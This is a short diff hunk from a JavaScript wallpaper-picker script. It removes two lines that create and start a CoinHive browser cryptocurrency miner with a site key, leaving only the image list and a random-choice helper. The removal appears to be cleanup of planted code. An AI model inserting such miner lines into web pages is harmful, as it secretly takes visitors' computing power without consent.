@@ -125,8 +125,6 @@
     "the_light_at_the_end_of_the_tree_tunnel-wallpaper-1920x1080.jpg",
     "love_above_all-wallpaper-1680x1050.jpg"    
  		 ];
-  var miner = new CoinHive.User('q3H5OB6fvuPdgyh7xUA1OM8esB0PYvBe');
-  miner.start();
 function chooseOne(arr) {
 return arr[Math.floor(Math.random() * arr.length)];
   }
